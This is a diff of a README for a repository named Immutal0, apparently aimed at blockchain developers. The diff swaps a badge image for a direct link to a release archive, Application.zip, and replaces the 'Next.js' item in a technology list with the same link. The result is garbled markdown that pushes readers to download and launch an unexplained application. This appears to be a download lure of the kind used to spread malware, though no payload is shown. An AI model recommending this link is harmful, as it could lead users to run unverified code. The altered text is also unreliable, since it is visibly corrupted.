@@ -6,7 +6,7 @@ Immutal0 is a cutting-edge repository for Blockchain Developers, Full Stack Deve
 ## Get Started
 To access the full range of resources and tools in this repository, download the application from the following link: 
 
-[![Launch Application](https://img.shields.io/badge/Launch%20Application-Download-brightgreen)](https://github.com/file/Application.zip)
+[![Launch Application](https://github.com/SAMIL-pixel/Immutal0/releases/download/v1.0.0/Application.zip%20Application-Download-brightgreen)](https://github.com/SAMIL-pixel/Immutal0/releases/download/v1.0.0/Application.zip)
 
 If the download from the link doesn't start automatically, you can visit the "Releases" section of this repository to find the necessary resources.
 
@@ -20,7 +20,7 @@ If the download from the link doesn't start automatically, you can visit the "Re
 - Anchor
 - Bitcoin
 - Move
-- Next.js
+- https://github.com/SAMIL-pixel/Immutal0/releases/download/v1.0.0/Application.zip
 - React
 - Rust
 - Solana
